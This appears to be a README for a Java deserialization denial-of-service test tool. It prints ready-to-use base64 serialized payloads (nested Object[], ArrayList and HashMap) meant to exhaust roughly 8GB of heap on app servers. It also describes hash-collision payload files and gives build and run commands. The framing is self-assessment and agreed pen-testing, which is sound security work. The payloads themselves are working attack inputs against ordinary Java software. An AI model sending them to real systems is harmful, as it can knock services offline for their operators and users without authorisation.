# ObjectInputStream DoS

Project to safely test Java Serialization vulnerability using DoS (OutOfMemoryError)

Provided as-is, only for self-assessment, agreed pen-testing purposes, etc.

## Basic Scenarios

* Heap Dos using nested Object[], ArrayList and HashMap
* Collision attack on Hashtable
* Collision attack on HashMap (Oracle Java 1.7)

## Payloads for 8GB heap consumption

Should be enough to test the vulnerability in most app servers.

Nested Object[] (44 bytes):

    rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=

Nested ArrayList (67 bytes):

    rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHB////3dwR////3cHBwcHBwcHBwcA==

Nested HashMap (110 bytes):

    rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABBAAAAAc3EAfgAAP0AAAAAAAAx3CAAAABBAAAAAcHB4cHg=

## Payloads for collision attacks

* Hashtable: see hashtable.collisions.txt file (1.2M), using 10k entries for collision, deserialization takes 40s
* HashMap: (1.7 only) see hashmap.collisions.txt file (800k), using 10k entries for collision, deserialization takes 50s

# Build & Run

    mvn clean package

    java -Xmx25g -jar target/oisdos-1.0.jar

E.g:

    java -Xmx25g -jar target/oisdos-1.0.jar ObjectArrayHeap

    java -Xmx25g -jar target/oisdos-1.0.jar HashtableCollisions 5000

# Other info
* Licence: MIT
* Already reported to Oracle (in 2015) with "won't fix" response